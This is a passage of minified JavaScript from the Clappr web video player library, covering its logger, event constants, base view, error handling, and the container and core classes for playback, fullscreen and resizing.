this._level},set:function(e){this._level=e}}]),s(r,[{key:"debug",value:function(e){this.log(e,0,Array.prototype.slice.call(arguments,1))}},{key:"info",value:function(e){this.log(e,1,Array.prototype.slice.call(arguments,1))}},{key:"warn",value:function(e){this.log(e,2,Array.prototype.slice.call(arguments,1))}},{key:"error",value:function(e){this.log(e,3,Array.prototype.slice.call(arguments,1))}},{key:"onOff",value:function(){this.level===this.offLevel?this.level=this.previousLevel:(this.previousLevel=this.level,this.level=this.offLevel),window.console&&window.console.log&&window.console.log("%c[Clappr.Log] set log level to "+er[this.level],Qt)}},{key:"log",value:function(e,t,r){0<=this.EXCLUDE_LIST.indexOf(r[0])||t<this.level||(r||(r=e,e=null),window.console&&window.console.log&&window.console.log.apply(console,["%c["+er[t]+"]"+(e?"["+e+"]":""),Jt[t]].concat(r)))}}]),r}(),tr=(D.LEVEL_DEBUG=0,D.LEVEL_INFO=1,D.LEVEL_WARN=2,D.LEVEL_ERROR=3,D.getInstance=function(){return void 0===this._instance&&(this._instance=new this),this._instance},D.setLevel=function(e){this.getInstance().level=e},D.debug=function(){this.getInstance().debug.apply(this.getInstance(),arguments)},D.info=function(){this.getInstance().info.apply(this.getInstance(),arguments)},D.warn=function(){this.getInstance().warn.apply(this.getInstance(),arguments)},D.error=function(){this.getInstance().error.apply(this.getInstance(),arguments)},Array.prototype.slice),rr=/\s+/,P=function(){function r(){u(this,r)}return s(r,[{key:"on",value:function(e,t,r){return Yt(this,"on",e,[t,r])&&t&&(this._events||(this._events={}),(this._events[e]||(this._events[e]=[])).push({callback:t,context:r,ctx:r||this})),this}},{key:"once",value:function(e,t,r){var n,i=this;return Yt(this,"once",e,[t,r])&&t?(n=function(){i.off(e,n),t.apply(this,arguments)},this.on(e,n,r)):this}},{key:"off",value:function(e,t,r){var n,i,a,s,o,l,u,c;if(this._events&&Yt(this,"off",e,[t,r]))if(e||t||r){for(o=0,l=(s=e?[e]:Object.keys(this._events)).length;o<l;o++)if(e=s[o],a=this._events[e]){if(this._events[e]=n=[],t||r)for(u=0,c=a.length;u<c;u++)i=a[u],(t&&t!==i.callback&&t!==i.callback._callback||r&&r!==i.context)&&n.push(i);n.length||delete this._events[e]}}else this._events=void 0;return this}},{key:"trigger",value:function(e){var t,r,n,i=this.name||this.constructor.name;return D.debug.apply(D,[i].concat(Array.prototype.slice.call(arguments))),this._events&&Yt(this,"trigger",e,t=tr.call(arguments,1))&&(r=this._events[e],n=this._events.all,r&&Ht(r,t,i,e),n)&&Ht(n,arguments,i,e),this}},{key:"stopListening",value:function(e,t,r){var n=this._listeningTo;if(n){var i,a=!t&&!r;for(i in r||"object"!==F(t)||(r=this),e&&((n={})[e._listenId]=e),n)(e=n[i]).off(t,r,this),!a&&0!==Object.keys(e._events).length||delete this._listeningTo[i]}return this}}],[{key:"register",value:function(e){r.Custom||(r.Custom={});var t="string"==typeof e&&e.toUpperCase().trim();t&&!r.Custom[t]?r.Custom[t]=t.toLowerCase().split("_").map((function(e,t){return 0===t?e:e[0].toUpperCase()+e.slice(1)})).join(""):D.error("Events","Error when register event: "+e)}},{key:"listAvailableCustomEvents",value:function(){return r.Custom||(r.Custom={}),Object.keys(r.Custom).filter((function(e){return"string"==typeof r.Custom[e]}))}}]),r}(),nr={listenTo:"on",listenToOnce:"once"},N=(Object.keys(nr).forEach((function(n){P.prototype[n]=function(e,t,r){return(this._listeningTo||(this._listeningTo={}))[e._listenId||(e._listenId=Ut("l"))]=e,r||"object"!==F(t)||(r=this),e[nr[n]](t,r,this),this}})),P.PLAYER_READY="ready",P.PLAYER_RESIZE="resize",P.PLAYER_FULLSCREEN="fullscreen",P.PLAYER_PLAY="play",P.PLAYER_PAUSE="pause",P.PLAYER_STOP="stop",P.PLAYER_ENDED="ended",P.PLAYER_SEEK="seek",P.PLAYER_ERROR="playererror",P.ERROR="error",P.PLAYER_TIMEUPDATE="timeupdate",P.PLAYER_VOLUMEUPDATE="volumeupdate",P.PLAYER_SUBTITLE_AVAILABLE="subtitleavailable",P.PLAYBACK_PROGRESS="playback:progress",P.PLAYBACK_TIMEUPDATE="playback:timeupdate",P.PLAYBACK_READY="playback:ready",P.PLAYBACK_BUFFERING="playback:buffering",P.PLAYBACK_BUFFERFULL="playback:bufferfull",P.PLAYBACK_SETTINGSUPDATE="playback:settingsupdate",P.PLAYBACK_LOADEDMETADATA="playback:loadedmetadata",P.PLAYBACK_HIGHDEFINITIONUPDATE="playback:highdefinitionupdate",P.PLAYBACK_BITRATE="playback:bitrate",P.PLAYBACK_LEVELS_AVAILABLE="playback:levels:available",P.PLAYBACK_LEVEL_SWITCH_START="playback:levels:switch:start",P.PLAYBACK_LEVEL_SWITCH_END="playback:levels:switch:end",P.PLAYBACK_PLAYBACKSTATE="playback:playbackstate",P.PLAYBACK_DVR="playback:dvr",P.PLAYBACK_MEDIACONTROL_DISABLE="playback:mediacontrol:disable",P.PLAYBACK_MEDIACONTROL_ENABLE="playback:mediacontrol:enable",P.PLAYBACK_ENDED="playback:ended",P.PLAYBACK_PLAY_INTENT="playback:play:intent",P.PLAYBACK_PLAY="playback:play",P.PLAYBACK_PAUSE="playback:pause",P.PLAYBACK_SEEK="playback:seek",P.PLAYBACK_SEEKED="playback:seeked",P.PLAYBACK_STOP="playback:stop",P.PLAYBACK_ERROR="playback:error",P.PLAYBACK_STATS_ADD="playback:stats:add",P.PLAYBACK_FRAGMENT_LOADED="playback:fragment:loaded",P.PLAYBACK_LEVEL_SWITCH="playback:level:switch",P.PLAYBACK_SUBTITLE_AVAILABLE="playback:subtitle:available",P.PLAYBACK_SUBTITLE_CHANGED="playback:subtitle:changed",P.CORE_CONTAINERS_CREATED="core:containers:created",P.CORE_ACTIVE_CONTAINER_CHANGED="core:active:container:changed",P.CORE_OPTIONS_CHANGE="core:options:change",P.CORE_READY="core:ready",P.CORE_FULLSCREEN="core:fullscreen",P.CORE_RESIZE="core:resize",P.CORE_SCREEN_ORIENTATION_CHANGED="core:screen:orientation:changed",P.CORE_MOUSE_MOVE="core:mousemove",P.CORE_MOUSE_LEAVE="core:mouseleave",P.CONTAINER_PLAYBACKSTATE="container:playbackstate",P.CONTAINER_PLAYBACKDVRSTATECHANGED="container:dvr",P.CONTAINER_BITRATE="container:bitrate",P.CONTAINER_STATS_REPORT="container:stats:report",P.CONTAINER_DESTROYED="container:destroyed",P.CONTAINER_READY="container:ready",P.CONTAINER_RESIZE="container:resize",P.CONTAINER_ERROR="container:error",P.CONTAINER_LOADEDMETADATA="container:loadedmetadata",P.CONTAINER_SUBTITLE_AVAILABLE="container:subtitle:available",P.CONTAINER_SUBTITLE_CHANGED="container:subtitle:changed",P.CONTAINER_TIMEUPDATE="container:timeupdate",P.CONTAINER_PROGRESS="container:progress",P.CONTAINER_PLAY="container:play",P.CONTAINER_STOP="container:stop",P.CONTAINER_PAUSE="container:pause",P.CONTAINER_ENDED="container:ended",P.CONTAINER_CLICK="container:click",P.CONTAINER_DBLCLICK="container:dblclick",P.CONTAINER_CONTEXTMENU="container:contextmenu",P.CONTAINER_MOUSE_ENTER="container:mouseenter",P.CONTAINER_MOUSE_LEAVE="container:mouseleave",P.CONTAINER_MOUSE_UP="container:mouseup",P.CONTAINER_MOUSE_DOWN="container:mousedown",P.CONTAINER_SEEK="container:seek",P.CONTAINER_SEEKED="container:seeked",P.CONTAINER_VOLUME="container:volume",P.CONTAINER_FULLSCREEN="container:fullscreen",P.CONTAINER_STATE_BUFFERING="container:state:buffering",P.CONTAINER_STATE_BUFFERFULL="container:state:bufferfull",P.CONTAINER_SETTINGSUPDATE="container:settingsupdate",P.CONTAINER_HIGHDEFINITIONUPDATE="container:highdefinitionupdate",P.CONTAINER_MEDIACONTROL_SHOW="container:mediacontrol:show",P.CONTAINER_MEDIACONTROL_HIDE="container:mediacontrol:hide",P.CONTAINER_MEDIACONTROL_DISABLE="container:mediacontrol:disable",P.CONTAINER_MEDIACONTROL_ENABLE="container:mediacontrol:enable",P.CONTAINER_STATS_ADD="container:stats:add",P.CONTAINER_OPTIONS_CHANGE="container:options:change",P.MEDIACONTROL_RENDERED="mediacontrol:rendered",P.MEDIACONTROL_FULLSCREEN="mediacontrol:fullscreen",P.MEDIACONTROL_SHOW="mediacontrol:show",P.MEDIACONTROL_HIDE="mediacontrol:hide",P.MEDIACONTROL_MOUSEMOVE_SEEKBAR="mediacontrol:mousemove:seekbar",P.MEDIACONTROL_MOUSELEAVE_SEEKBAR="mediacontrol:mouseleave:seekbar",P.MEDIACONTROL_PLAYING="mediacontrol:playing",P.MEDIACONTROL_NOTPLAYING="mediacontrol:notplaying",P.MEDIACONTROL_CONTAINERCHANGED="mediacontrol:containerchanged",P.MEDIACONTROL_OPTIONS_CHANGE="mediacontrol:options:change",function(){c(n,P);var r=d(n);function n(){var e,t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{};return u(this,n),(e=r.call(this,t))._options=t,e.uniqueId=Ut("o"),e}return s(n,[{key:"options",get:function(){return this._options}}]),n}()),ir={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,escape:/<%-([\s\S]+?)%>/g},ar=/(.)^/,sr={"'":"'","\\":"\\","\r":"r","\n":"n","\t":"t","\u2028":"u2028","\u2029":"u2029"},or=/\\|'|\r|\n|\t|\u2028|\u2029/g,lr={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;"},ur=new RegExp("[&<>\"']","g"),cr=0,dr=($t.settings=ir,{getStyleFor:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{baseUrl:""};return O('<style class="clappr-style"></style>').html($t(e.toString())(t))}}),fr=/^(\S+)\s*(.*)$/,hr=function(){c(r,N);var t=d(r);function r(e){return u(this,r),(e=t.call(this,e)).cid=Ut("c"),e._ensureElement(),e.delegateEvents(),e}return s(r,[{key:"tagName",get:function(){return"div"}},{key:"events",get:function(){return{}}},{key:"attributes",get:function(){return{}}}]),s(r,[{key:"$",value:function(e){return this.$el.find(e)}},{key:"render",value:function(){return this}},{key:"destroy",value:function(){return this.$el.remove(),this.stopListening(),this.undelegateEvents(),this}},{key:"setElement",value:function(e,t){return this.$el&&this.undelegateEvents(),this.$el=O.zepto.isZ(e)?e:O(e),this.el=this.$el[0],!1!==t&&this.delegateEvents(),this}},{key:"delegateEvents",value:function(e){for(var t in e=e||this.events,this.undelegateEvents(),e){var r,n=e[t];(n=n&&n.constructor!==Function?this[e[t]]:n)&&(r=(t=t.match(fr))[1],t=t[2],r+=".delegateEvents"+this.cid,""===t?this.$el.on(r,n.bind(this)):this.$el.on(r,t,n.bind(this)))}return this}},{key:"undelegateEvents",value:function(){return this.$el.off(".delegateEvents"+this.cid),this}},{key:"_ensureElement",value:function(){var e;this.el?this.setElement(this.el,!1):(e=O.extend(!0,{},this.attributes),this.id&&(e.id=this.id),this.className&&(e.class=this.className),e=O(qt.create(this.tagName)).attr(e),this.setElement(e,!1))}}]),r}(),pr=function(){c(n,N);var r=d(n);function n(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{},t=1<arguments.length?arguments[1]:void 0;return u(this,n),(e=r.call(this,e)).core=t,e}return s(n,[{key:"name",get:function(){return"error"}}],[{key:"Levels",get:function(){return{FATAL:"FATAL",WARN:"WARN",INFO:"INFO"}}}]),s(n,[{key:"createError",value:function(e){this.core?this.core.trigger(P.ERROR,e):D.warn(this.name,"Core is not set. Error: ",e)}}]),n}(),vr=(t={createError:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{useCodePrefix:!0},r=this.constructor&&this.constructor.type||"",n=this.name||r,i=this.i18n||this.core&&this.core.i18n||this.container&&this.container.i18n,a="".concat(n,":").concat(e&&e.code||"unknown");r={description:"",level:pr.Levels.FATAL,origin:n,scope:r,raw:{}},r=Object.assign({},r,e,{code:t.useCodePrefix?a:e.code});return i&&r.level==pr.Levels.FATAL&&!r.UI&&(t={title:i.t("default_error_title"),message:i.t("default_error_message")},r.UI=t),this.playerError?this.playerError.createError(r):D.warn(n,"PlayerError is not defined. Error: ",r),r}},function(){c(n,hr);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e.options)).core=e,t.enabled=!0,t.bindEvents(),t.render(),t}return s(n,[{key:"playerError",get:function(){return this.core.playerError}}]),s(n,[{key:"bindEvents",value:function(){}},{key:"getExternalInterface",value:function(){return{}}},{key:"enable",value:function(){this.enabled||(this.bindEvents(),this.$el.show(),this.enabled=!0)}},{key:"disable",value:function(){this.stopListening(),this.$el.hide(),this.enabled=!1}},{key:"render",value:function(){return this}}]),n}()),gr=(Object.assign(vr.prototype,t),vr.extend=function(e){return xt(vr,e)},vr.type="core",function(){c(a,hr);var i=d(a);function a(e,t,r){var n;return u(this,a),(n=i.call(this,e))._i18n=t,n.currentTime=0,n.volume=100,n.playback=e.playback,n.playerError=r,n.settings=O.extend(!0,{},n.playback.settings),n.isReady=!1,n.mediaControlDisabled=!1,n.plugins=[n.playback],n.dblTapHandler=new Xt(500),n.clickTimer=null,n.clickDelay=200,n.bindEvents(),n}return s(a,[{key:"name",get:function(){return"Container"}},{key:"attributes",get:function(){return{class:"container","data-container":""}}},{key:"events",get:function(){return{click:"clicked",dblclick:"dblClicked",touchend:"dblTap",contextmenu:"onContextMenu",mouseenter:"mouseEnter",mouseleave:"mouseLeave",mouseup:"onMouseUp",mousedown:"onMouseDown"}}},{key:"ended",get:function(){return this.playback.ended}},{key:"buffering",get:function(){return this.playback.buffering}},{key:"i18n",get:function(){return this._i18n}},{key:"hasClosedCaptionsTracks",get:function(){return this.playback.hasClosedCaptionsTracks}},{key:"closedCaptionsTracks",get:function(){return this.playback.closedCaptionsTracks}},{key:"closedCaptionsTrackId",get:function(){return this.playback.closedCaptionsTrackId},set:function(e){this.playback.closedCaptionsTrackId=e}}]),s(a,[{key:"bindEvents",value:function(){this.listenTo(this.playback,P.PLAYBACK_PROGRESS,this.onProgress),this.listenTo(this.playback,P.PLAYBACK_TIMEUPDATE,this.timeUpdated),this.listenTo(this.playback,P.PLAYBACK_READY,this.ready),this.listenTo(this.playback,P.PLAYBACK_BUFFERING,this.onBuffering),this.listenTo(this.playback,P.PLAYBACK_BUFFERFULL,this.bufferfull),this.listenTo(this.playback,P.PLAYBACK_SETTINGSUPDATE,this.settingsUpdate),this.listenTo(this.playback,P.PLAYBACK_LOADEDMETADATA,this.loadedMetadata),this.listenTo(this.playback,P.PLAYBACK_HIGHDEFINITIONUPDATE,this.highDefinitionUpdate),this.listenTo(this.playback,P.PLAYBACK_BITRATE,this.updateBitrate),this.listenTo(this.playback,P.PLAYBACK_PLAYBACKSTATE,this.playbackStateChanged),this.listenTo(this.playback,P.PLAYBACK_DVR,this.playbackDvrStateChanged),this.listenTo(this.playback,P.PLAYBACK_MEDIACONTROL_DISABLE,this.disableMediaControl),this.listenTo(this.playback,P.PLAYBACK_MEDIACONTROL_ENABLE,this.enableMediaControl),this.listenTo(this.playback,P.PLAYBACK_SEEK,this.onSeek),this.listenTo(this.playback,P.PLAYBACK_SEEKED,this.onSeeked),this.listenTo(this.playback,P.PLAYBACK_ENDED,this.onEnded),this.listenTo(this.playback,P.PLAYBACK_PLAY,this.playing),this.listenTo(this.playback,P.PLAYBACK_PAUSE,this.paused),this.listenTo(this.playback,P.PLAYBACK_STOP,this.stopped),this.listenTo(this.playback,P.PLAYBACK_ERROR,this.error),this.listenTo(this.playback,P.PLAYBACK_SUBTITLE_AVAILABLE,this.subtitleAvailable),this.listenTo(this.playback,P.PLAYBACK_SUBTITLE_CHANGED,this.subtitleChanged)}},{key:"subtitleAvailable",value:function(){this.trigger(P.CONTAINER_SUBTITLE_AVAILABLE)}},{key:"subtitleChanged",value:function(e){this.trigger(P.CONTAINER_SUBTITLE_CHANGED,e)}},{key:"playbackStateChanged",value:function(e){this.trigger(P.CONTAINER_PLAYBACKSTATE,e)}},{key:"playbackDvrStateChanged",value:function(e){this.settings=this.playback.settings,this.dvrInUse=e,this.trigger(P.CONTAINER_PLAYBACKDVRSTATECHANGED,e)}},{key:"updateBitrate",value:function(e){this.trigger(P.CONTAINER_BITRATE,e)}},{key:"statsReport",value:function(e){this.trigger(P.CONTAINER_STATS_REPORT,e)}},{key:"getPlaybackType",value:function(){return this.playback.getPlaybackType()}},{key:"isDvrEnabled",value:function(){return!!this.playback.dvrEnabled}},{key:"isDvrInUse",value:function(){return!!this.dvrInUse}},{key:"destroy",value:function(){this.disableResizeObserver(),this.trigger(P.CONTAINER_DESTROYED,this,this.name),this.stopListening(),this.plugins.forEach((function(e){return e.destroy()})),this.$el.remove()}},{key:"setStyle",value:function(e){this.$el.css(e)}},{key:"animate",value:function(e,t){return this.$el.animate(e,t).promise()}},{key:"ready",value:function(){this.isReady=!0,this.trigger(P.CONTAINER_READY,this.name)}},{key:"isPlaying",value:function(){return this.playback.isPlaying()}},{key:"getStartTimeOffset",value:function(){return this.playback.getStartTimeOffset()}},{key:"getCurrentTime",value:function(){return this.currentTime}},{key:"getDuration",value:function(){return this.playback.getDuration()}},{key:"error",value:function(e){this.isReady||this.ready(),this.trigger(P.CONTAINER_ERROR,e,this.name)}},{key:"loadedMetadata",value:function(e){this.trigger(P.CONTAINER_LOADEDMETADATA,e)}},{key:"timeUpdated",value:function(e){this.currentTime=e.current,this.trigger(P.CONTAINER_TIMEUPDATE,e,this.name)}},{key:"onProgress",value:function(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];this.trigger.apply(this,[P.CONTAINER_PROGRESS].concat(t,[this.name]))}},{key:"playing",value:function(){this.trigger(P.CONTAINER_PLAY,this.name)}},{key:"paused",value:function(){this.trigger(P.CONTAINER_PAUSE,this.name)}},{key:"play",value:function(){this.playback.play()}},{key:"stop",value:function(){this.playback.stop(),this.currentTime=0}},{key:"pause",value:function(){this.playback.pause()}},{key:"onEnded",value:function(){this.trigger(P.CONTAINER_ENDED,this,this.name),this.currentTime=0}},{key:"stopped",value:function(){this.trigger(P.CONTAINER_STOP)}},{key:"clicked",value:function(){var e=this;this.options.chromeless&&!this.options.allowUserInteraction||(this.clickTimer=setTimeout((function(){e.clickTimer&&e.trigger(P.CONTAINER_CLICK,e,e.name)}),this.clickDelay))}},{key:"cancelClicked",value:function(){clearTimeout(this.clickTimer),this.clickTimer=null}},{key:"dblClicked",value:function(){this.options.chromeless&&!this.options.allowUserInteraction||(this.cancelClicked(),this.trigger(P.CONTAINER_DBLCLICK,this,this.name))}},{key:"dblTap",value:function(e){var t=this;this.options.chromeless&&!this.options.allowUserInteraction||this.dblTapHandler.handle(e,(function(){t.cancelClicked(),t.trigger(P.CONTAINER_DBLCLICK,t,t.name)}))}},{key:"onContextMenu",value:function(e){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(P.CONTAINER_CONTEXTMENU,e,this.name)}},{key:"seek",value:function(e){this.playback.seek(e)}},{key:"onSeek",value:function(e){this.trigger(P.CONTAINER_SEEK,e,this.name)}},{key:"onSeeked",value:function(){this.trigger(P.CONTAINER_SEEKED,this.name)}},{key:"seekPercentage",value:function(e){var t=this.getDuration();0<=e&&e<=100&&this.seek(t*(e/100))}},{key:"setVolume",value:function(e){this.volume=parseFloat(e),this.trigger(P.CONTAINER_VOLUME,this.volume,this.name),this.playback.volume(this.volume)}},{key:"fullscreen",value:function(){this.trigger(P.CONTAINER_FULLSCREEN,this.name)}},{key:"onBuffering",value:function(){this.trigger(P.CONTAINER_STATE_BUFFERING,this.name)}},{key:"bufferfull",value:function(){this.trigger(P.CONTAINER_STATE_BUFFERFULL,this.name)}},{key:"addPlugin",value:function(e){this.plugins.push(e)}},{key:"hasPlugin",value:function(e){return!!this.getPlugin(e)}},{key:"getPlugin",value:function(t){return this.plugins.filter((function(e){return e.name===t}))[0]}},{key:"mouseEnter",value:function(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(P.CONTAINER_MOUSE_ENTER)}},{key:"mouseLeave",value:function(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(P.CONTAINER_MOUSE_LEAVE)}},{key:"mouseUp",value:function(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(P.CONTAINER_MOUSE_UP)}},{key:"mouseDown",value:function(){this.options.chromeless&&!this.options.allowUserInteraction||this.trigger(P.CONTAINER_MOUSE_DOWN)}},{key:"settingsUpdate",value:function(){this.settings=this.playback.settings,this.trigger(P.CONTAINER_SETTINGSUPDATE)}},{key:"highDefinitionUpdate",value:function(e){this.trigger(P.CONTAINER_HIGHDEFINITIONUPDATE,e)}},{key:"isHighDefinitionInUse",value:function(){return this.playback.isHighDefinitionInUse()}},{key:"disableMediaControl",value:function(){this.mediaControlDisabled||(this.mediaControlDisabled=!0,this.trigger(P.CONTAINER_MEDIACONTROL_DISABLE))}},{key:"enableMediaControl",value:function(){this.mediaControlDisabled&&(this.mediaControlDisabled=!1,this.trigger(P.CONTAINER_MEDIACONTROL_ENABLE))}},{key:"updateStyle",value:function(){!this.options.chromeless||this.options.allowUserInteraction?this.$el.removeClass("chromeless"):this.$el.addClass("chromeless")}},{key:"enableResizeObserver",value:function(){var e=this;this.disableResizeObserver(),this.resizeObserverInterval=setInterval((function(){return e.checkResize()}),500)}},{key:"disableResizeObserver",value:function(){this.resizeObserverInterval&&clearInterval(this.resizeObserverInterval)}},{key:"checkResize",value:function(){var e={width:this.el.clientWidth,height:this.el.clientHeight},t=this.currentSize||{},r=t.width;t.height===e.height&&r===e.width||(this.currentSize=e,this.trigger(P.CONTAINER_RESIZE,e))}},{key:"configure",value:function(e){this._options=O.extend(!0,this._options,e),this.updateStyle(),this.playback.configure(this.options),this.trigger(P.CONTAINER_OPTIONS_CHANGE)}},{key:"render",value:function(){var e=dr.getStyleFor(".container[data-container] {\n  position: absolute;\n  background-color: black;\n  height: 100%;\n  width: 100%;\n  max-width: 100%; }\n  .container[data-container] .chromeless {\n    cursor: default; }\n\n[data-player]:not(.nocursor) .container[data-container]:not(.chromeless).pointer-enabled {\n  cursor: pointer; }\n".toString(),{baseUrl:this.options.baseUrl});return this.$el.append(e[0]),this.$el.append(this.playback.render().el),this.updateStyle(),this.checkResize(),this.enableResizeObserver(),this}}]),a}()),x=(Object.assign(gr.prototype,t),function(){c(i,hr);var n=d(i);function i(e,t,r){return u(this,i),(e=n.call(this,e)).settings={},e._i18n=t,e.playerError=r,e._consented=!1,e}return s(i,[{key:"isAudioOnly",get:function(){return!1}},{key:"isAdaptive",get:function(){return!1}},{key:"ended",get:function(){return!1}},{key:"i18n",get:function(){return this._i18n}},{key:"buffering",get:function(){return!1}}]),s(i,[{key:"consent",value:function(e){"function"==typeof e&&e()}},{key:"play",value:function(){}},{key:"pause",value:function(){}},{key:"stop",value:function(){}},{key:"seek",value:function(e){}},{key:"seekPercentage",value:function(e){}},{key:"getStartTimeOffset",value:function(){return 0}},{key:"getDuration",value:function(){return 0}},{key:"isPlaying",value:function(){return!1}},{key:"getPlaybackType",value:function(){return i.NO_OP}},{key:"isHighDefinitionInUse",value:function(){return!1}},{key:"mute",value:function(){}},{key:"unmute",value:function(){}},{key:"volume",value:function(e){}},{key:"configure",value:function(e){this._options=O.extend(!0,this._options,e)}},{key:"attemptAutoPlay",value:function(){var r=this;this.canAutoPlay((function(e,t){e&&r.play()}))}},{key:"canAutoPlay",value:function(e){e(!0,null)}},{key:"isReady",get:function(){return!1}},{key:"hasClosedCaptionsTracks",get:function(){return 0<this.closedCaptionsTracks.length}},{key:"closedCaptionsTracks",get:function(){return[]}},{key:"closedCaptionsTrackId",get:function(){return-1},set:function(e){}}]),i}()),Ar=(Object.assign(x.prototype,t),x.extend=function(e){return xt(x,e)},x.canPlay=function(e,t){return!1},x.VOD="vod",x.AOD="aod",x.LIVE="live",x.NO_OP="no_op",x.type="playback",function(){c(a,N);var i=d(a);function a(e,t,r,n){return u(this,a),(e=i.call(this,e))._i18n=r,e.loader=t,e.playerError=n,e}return s(a,[{key:"options",get:function(){return this._options},set:function(e){this._options=e}}]),s(a,[{key:"createContainers",value:function(){var t=this;return O.Deferred((function(e){e.resolve(t.options.sources.map((function(e){return t.createContainer(e)})))}))}},{key:"findPlaybackPlugin",value:function(t,r){return this.loader.playbackPlugins.filter((function(e){return e.canPlay(t,r)}))[0]}},{key:"createContainer",value:function(e){var t=null,r=this.options.mimeType,n=(e=("object"===F(e)?(t=e.source.toString(),e.mimeType&&(r=e.mimeType)):t=e.toString(),t.match(/^\/\//)&&(t=window.location.protocol+t),j(j({},this.options),{},{src:t,mimeType:r})),r=(t=this.findPlaybackPlugin(t,r))?new t(e,this._i18n,this.playerError):new x,e=j(j({},e),{},{playback:r}),new gr(e,this._i18n,this.playerError)),i=O.Deferred();return i.promise(n),this.addContainerPlugins(n),this.listenToOnce(n,P.CONTAINER_READY,(function(){return i.resolve(n)})),n}},{key:"addContainerPlugins",value:function(t){this.loader.containerPlugins.forEach((function(e){t.addPlugin(new e(t))}))}}]),a}()),mr=function(){c(n,hr);var r=d(n);function n(e){var t;return u(this,n),(t=r.call(this,e)).playerError=new pr(e,G(t)),t.configureDomRecycler(),t.firstResize=!0,t.plugins=[],t.containers=[],t._boundFullscreenHandler=function(){return t.handleFullscreenChange()},O(document).bind("fullscreenchange",t._boundFullscreenHandler),O(document).bind("MSFullscreenChange",t._boundFullscreenHandler),O(document).bind("mozfullscreenchange",t._boundFullscreenHandler),L.isMobile&&O(window).bind("resize",(function(e){t.handleWindowResize(e)})),t}return s(n,[{key:"events",get:function(){return{webkitfullscreenchange:"handleFullscreenChange",mousemove:"onMouseMove",mouseleave:"onMouseLeave"}}},{key:"attributes",get:function(){return{"data-player":"",tabindex:9999}}},{key:"isReady",get:function(){return!!this.ready}},{key:"i18n",get:function(){return this.getPlugin("strings")||{t:function(e){return e}}}},{key:"mediaControl",get:function(){return this._mediaControl||(this._mediaControl=this.getPlugin("media_control"))||this.dummyMediaControl}},{key:"dummyMediaControl",get:function(){return this._dummyMediaControl||(this._dummyMediaControl=new vr(this)),this._dummyMediaControl}},{key:"activeContainer",get:function(){return this._activeContainer},set:function(e){this._activeContainer=e,this.trigger(P.CORE_ACTIVE_CONTAINER_CHANGED,this._activeContainer)}},{key:"activePlayback",get:function(){return this.activeContainer&&this.activeContainer.playback}}]),s(n,[{key:"configureDomRecycler",value:function(){var e=this.options&&this.options.playback&&this.options.playback.recycleVideo;qt.configure({recycleVideo:e})}},{key:"createContainers",value:function(e){this.defer=O.Deferred(),this.defer.promise(this),this.containerFactory=new Ar(e,e.loader,this.i18n,this.playerError),this.prepareContainers()}},{key:"prepareContainers",value:function(){var t=this;this.containerFactory.createContainers().then((function(e){return t.setupContainers(e)})).then((function(e){return t.resolveOnContainersReady(e)}))}},{key:"updateSize",value:function(){this.isFullscreen()?this.setFullscreen():this.setPlayerSize()}},{key:"setFullscreen",value:function(){L.isiOS||(this.$el.addClass("fullscreen"),this.$el.removeAttr("style"),this.previousSize={width:this.options.width,height:this.options.height},this.currentSize={width:O(window).width(),height:O(window).height()})}},{key:"setPlayerSize",value:function(){this.$el.removeClass("fullscreen"),this.currentSize=this.previousSize,this.previousSize={width:O(window).width(),height:O(window).height()},this.resize(this.currentSize)}},{key:"resize",value:function(e){jt(e.height)||jt(e.width)?(this.el.style.height="".concat(e.height,"px"),this.el.style.width="".concat(e.width,"px")):(this.el.style.height="".concat(e.height),this.el.style.width="".concat(e.width)),this.previousSize={width:this.options.width,height:this.options.height},this.options.width=e.width,this.options.height=e.height,this.currentSize=e,this.triggerResize(this.currentSize)}},{key:"enableResizeObserver",value:function(){var e=this;this.disableResizeObserver(),this.resizeObserverInterval=setInterval((function(){e.triggerResize({width:e.el.clientWidth,height:e.el.clientHeight})}),500)}},{key:"triggerResize",value:function(e){!this.firstResize&&this.oldHeight===e.height&&this.oldWidth===e.width||(this.oldHeight=e.height,this.oldWidth=e.width,this.computedSize=e,this.firstResize=!1,this.trigger(P.CORE_RESIZE,e))}},{key:"disableResizeObserver",value:function(){this.resizeObserverInterval&&clearInterval(this.resizeObserverInterval),this.resizeObserverInterval=null}},{key:"resolveOnContainersReady",value:function(e){var t=this;O.when.apply(O,e).done((function(){t.defer.resolve(t),t.ready=!0,t.trigger(P.CORE_READY)}))}},{key:"addPlugin",value:function(e){this.plugins.push(e)}},{key:"hasPlugin",value:function(e){return!!this.getPlugin(e)}},{key:"getPlugin",value:function(t){return this.plugins.filter((function(e){return e.name===t}))[0]}},{key:"load",value:function(e,t){this.options.mimeType=t,e=e&&e.constructor===Array?e:[e],this.options.sources=e,this.containers.forEach((function(e){return e.destroy()})),this.containerFactory.options=O.extend(!0,this.options,{sources:e}),this.prepareContainers()}},{key:"destroy",value:function(){this.disableResizeObserver(),this.containers.forEach((function(e){return e.destroy()})),this.plugins.forEach((function(e){return e.destroy()})),this.$el.remove(),O(document).unbind("fullscreenchange",this._boundFullscreenHandler),O(document).unbind("MSFullscreenChange",this._boundFullscreenHandler),O(document).unbind("mozfullscreenchange",this._boundFullscreenHandler),this.stopListening()}},{key:"handleFullscreenChange",value:function(){this.trigger(P.CORE_FULLSCREEN,this.isFullscreen()),this.updateSize()}},{key:"handleWindowResize",value:function(e){var t=window.innerWidth>window.innerHeight?"landscape":"portrait";this._screenOrientation!==t&&(this._screenOrientation=t,this.triggerResize({width:this.el.clientWidth,height:this.el.clientHeight}),this.trigger(P.CORE_SCREEN_ORIENTATION_CHANGED,{event:e,orientation:this._screenOrientation}))}},{key:"removeContainer",value:function(t){this.stopListening(t),this.containers=this.containers.filter((function(e){return e!==t}))}},{key:"setupContainer",value:function(e){this.listenTo(e,P.CONTAINER_DESTROYED,this.removeContainer),this.containers.push(e)}},{key:"setupContainers",value:function(e){return 